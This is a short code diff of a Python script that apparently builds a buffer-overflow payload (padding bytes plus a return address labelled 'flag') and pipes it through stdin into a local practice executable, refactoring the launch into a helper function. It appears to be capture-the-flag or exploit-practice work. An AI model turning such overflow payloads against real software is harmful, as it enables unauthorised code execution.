@@ -9,7 +9,11 @@ flag = b'\x57\x80\x40\x00'
 
 leak_flag = call_func+message*12+b"aaaaaaaaaaa"+flag
 
-subprocess
-p = Popen(['C:\\Users\\Austin\\Documents\\tempProj.exe'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
-stdout_data = p.communicate(input=b"a"*64+flag)[0]
-print(stdout_data)
+
+def stdinInput(path,payload):
+    p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE)
+    stdout_data = p.communicate(input=payload)[0]
+    print(stdout_data)
+    
+    
+stdinInput("C:\\Users\\Austin\\Desktop\\tempProj.exe",leak_flag)
